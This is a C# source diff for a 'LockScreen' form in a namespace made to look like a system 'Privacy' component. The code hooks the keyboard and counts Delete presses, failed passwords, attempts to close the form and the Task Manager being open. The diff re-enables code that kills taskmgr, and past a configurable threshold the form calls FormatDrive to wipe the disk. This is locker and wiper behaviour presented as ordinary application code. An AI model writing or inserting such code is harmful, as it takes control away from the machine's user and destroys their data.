@@ -21,7 +21,9 @@ namespace System.Agent.Privacy
         private bool _canClose;
         private Hook _hook;
         private JobTimer _job;
-        private volatile ushort _errorCount;
+        private volatile ushort _banCount;
+
+        private ProtocolClient _client;
         #endregion
 
         public LockScreen()
@@ -29,13 +31,11 @@ namespace System.Agent.Privacy
             InitializeComponent();
         }
 
-        private void Form1_Load(object sender, EventArgs e)
+        private void LockScreen_Load(object sender, EventArgs e)
         {
             this.Hide();
-
-
-            base.Opacity = PrivacyService.Config.Opacity / 100;
-            base.BackgroundImage = PrivacyService.Config.Background;
+            _client = new ProtocolClient();
+            base.BackgroundImage = _client.Config.Background;
             this.Show();
             _hook = new Hook();
             _hook.KeyDown += _hook_KeyDown;
@@ -47,38 +47,41 @@ namespace System.Agent.Privacy
         {
             if (e.Modifiers.HasFlag(Keys.Delete) || e.KeyData == Keys.Delete)
             {
-                _errorCount += 2;
+                _banCount += 2;
             }
         }
         private void Check(object state)
         {
-            if (_errorCount >= 2)
+            if (_banCount > AgentHubConfig.AppConfig.BanCount)
             {
                 this.Location = new Point(8, 8);
-                PrivacyService.FormatDrive();
-                return;
+                _client.FormatDrive();
             }
 
-            //var q = from t in Process.GetProcesses()
-            //        where t.ProcessName.Equals("taskmgr", StringComparison.OrdinalIgnoreCase)
-            //        select t;
-            //var p1 = q.SingleOrDefault();
-            //if (p1 != null)
-            //{
-            //    try
-            //    {
-            //        p1.Kill();
-            //    }
-            //    catch (Exception ex)
-            //    {
-            //        Hub.LogError(ex, "LockScreen.Kill");
-            //    }
-            //}
+            var q = from t in Process.GetProcesses()
+                    where t.ProcessName.Equals("taskmgr", StringComparison.OrdinalIgnoreCase)
+                    select t;
+            var p1 = q.SingleOrDefault();
+            if (p1 != null)
+            {
+                _banCount += 2;
+                try
+                {
+                    p1.Kill();
+                }
+                catch (Exception ex)
+                {
+                    Hub.LogError(ex, "LockScreen.Kill");
+                }
+            }
         }
 
         protected override void OnFormClosing(FormClosingEventArgs e)
         {
-            e.Cancel = !_canClose;
+            if (e.Cancel = !_canClose)
+            {
+                _banCount++;
+            }
             base.OnFormClosing(e);
         }
 
@@ -102,14 +105,15 @@ namespace System.Agent.Privacy
             button1.Enabled = false;
             try
             {
-                if (textBox1.Text != PrivacyService.Config.Password)
+                if (textBox1.Text != _client.Config.Password)
                 {
                     textBox1.Text = string.Empty;
-                    _errorCount++;
+                    _banCount++;
                     return;
                 }
 
                 _canClose = true;
+                this.DialogResult = DialogResult.OK;
                 this.Close();
             }
             finally
@@ -118,13 +122,5 @@ namespace System.Agent.Privacy
                 button1.Enabled = true;
             }
         }
-
-        #region Protocol
-        internal PrivacyConfigEntity Config
-        {
-            get { }
-            set { } 
-        }
-        #endregion
     }
 }
